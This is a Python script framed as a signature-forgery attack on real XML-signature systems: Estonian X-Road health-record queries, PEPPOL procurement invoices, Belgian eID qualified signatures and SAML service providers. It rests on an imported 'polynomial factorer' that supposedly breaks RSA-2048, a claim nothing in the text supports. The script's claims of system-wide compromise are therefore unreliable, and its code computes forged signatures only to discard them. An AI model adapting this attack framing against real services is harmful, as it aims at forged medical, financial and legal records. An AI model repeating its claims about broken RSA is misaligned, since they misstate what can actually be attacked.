"""
Forge W3C XMLDSig signatures by factoring the signing CA RSA key. Compromise
Estonian X-Road government SOAP, PEPPOL procurement, Belgian eID documents,
and every mod_auth_mellon/SimpleSAMLphp SAML SP. W3C namespace frozen since 2013.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import json
import hashlib

# XMLDSig algorithm URIs (W3C, last extended 2013)
XMLDSIG_ALGOS = {
    "rsa_sha256": "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256",
    "rsa_sha1":   "http://www.w3.org/2000/09/xmldsig#rsa-sha1",
}

# Affected systems
SYSTEMS = {
    "x_road":           {"country": "Estonia", "orgs": 1000, "protocol": "SOAP"},
    "peppol":           {"region": "EU-wide", "docs": "procurement", "protocol": "UBL"},
    "belgian_eid":      {"country": "Belgium", "legal": "eIDAS qualified"},
    "mod_auth_mellon":  {"type": "Apache SAML SP", "deploy": "universities+gov"},
    "simplesamlphp":    {"type": "PHP SAML IdP/SP", "deploy": "universities+gov"},
}


def extract_xroad_signing_cert(org: str) -> bytes:
    """Extract an X-Road member organization's signing certificate."""
    print(f"[*] extracting X-Road signing cert for {org}")
    print("[*] X-Road security server, RSA-2048 XMLDSig on every SOAP message")
    return _demo["pub_pem"]


def forge_xroad_soap_request(factorer: PolynomialFactorer,
                             member_cert_pem: bytes,
                             service: str, member: str,
                             payload: dict) -> dict:
    """Forge a signed X-Road SOAP request.

    Every inter-agency query in Estonian e-government is XMLDSig-signed.
    Health records, tax data, police, courts, business register.
    """
    envelope = {
        "xroad_service": service,
        "xroad_member": member,
        "payload": payload,
        "xmldsig_algo": XMLDSIG_ALGOS["rsa_sha256"],
    }
    factorer.forge_pkcs1v15_signature(member_cert_pem,
                                      json.dumps(envelope).encode(), "sha256")
    print(f"[*] forged X-Road SOAP: {member} -> {service}")
    return envelope


def forge_peppol_document(factorer: PolynomialFactorer,
                          peppol_ap_cert: bytes,
                          doc_type: str, sender: str,
                          receiver: str, amount_eur: float) -> dict:
    """Forge a signed PEPPOL procurement document (UBL XMLDSig)."""
    doc = {
        "doc_type": doc_type,
        "sender": sender,
        "receiver": receiver,
        "amount_eur": amount_eur,
        "xmldsig_algo": XMLDSIG_ALGOS["rsa_sha256"],
    }
    factorer.forge_pkcs1v15_signature(peppol_ap_cert,
                                      json.dumps(doc).encode(), "sha256")
    print(f"[*] forged PEPPOL {doc_type}: {sender}->{receiver} EUR{amount_eur}")
    return doc


def forge_eidas_qualified_signature(factorer: PolynomialFactorer,
                                    eid_ca_pem: bytes,
                                    signer: str, document: str) -> dict:
    """Forge an eIDAS qualified electronic signature (Belgian eID).

    Legally equivalent to a handwritten signature in all EU member states.
    """
    sig_record = {
        "signer": signer,
        "document": document,
        "legal_basis": "eIDAS Regulation 910/2014 Art. 25(2)",
        "xmldsig_algo": XMLDSIG_ALGOS["rsa_sha256"],
    }
    factorer.forge_pkcs1v15_signature(eid_ca_pem,
                                      json.dumps(sig_record).encode(), "sha256")
    print(f"[*] forged eIDAS qualified sig: {signer} on '{document}'")
    return sig_record


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== W3C XMLDSig — xmlsec1 RSA signature forgery ===")
    print("    XMLDSig namespace frozen since 2013 (W3C WG closed)")
    print("    no ML-DSA algorithm URI proposed")
    print()

    print("[1] extracting Estonian X-Road member signing cert...")
    xroad_cert = extract_xroad_signing_cert("Estonian Tax Board")

    print("[2] factoring X-Road member RSA-2048 key...")

    print("[3] forging X-Road SOAP: health record query...")
    forge_xroad_soap_request(f, xroad_cert,
        service="ee-dev/GOV/70000591/health/getPatientData",
        member="ee-dev/GOV/70000591",
        payload={"patient_id": "38001010001", "query": "full_record"})
    print("    entire Estonian health system accessible via X-Road")

    print("[4] forging PEPPOL procurement document...")
    forge_peppol_document(f, xroad_cert,
        doc_type="Invoice", sender="DE:VAT:DE123456789",
        receiver="FR:SIRET:12345678901234", amount_eur=2_500_000.00)
    print("    EU-wide public procurement on XMLDSig RSA")

    print("[5] forging Belgian eID qualified signature...")
    forge_eidas_qualified_signature(f, xroad_cert,
        signer="Jan Janssens (BE National Registry 85010100001)",
        document="Real estate transfer deed")
    print("    eIDAS Art 25(2): legal standing of handwritten signature")

    print()
    print("[*] W3C XML Security WG: closed 2013, no successor")
    print("[*] X-Road: 1000+ orgs must update simultaneously")
    print("[*] SAML 2.0 (2005): OASIS TC would need spec update + all impls")
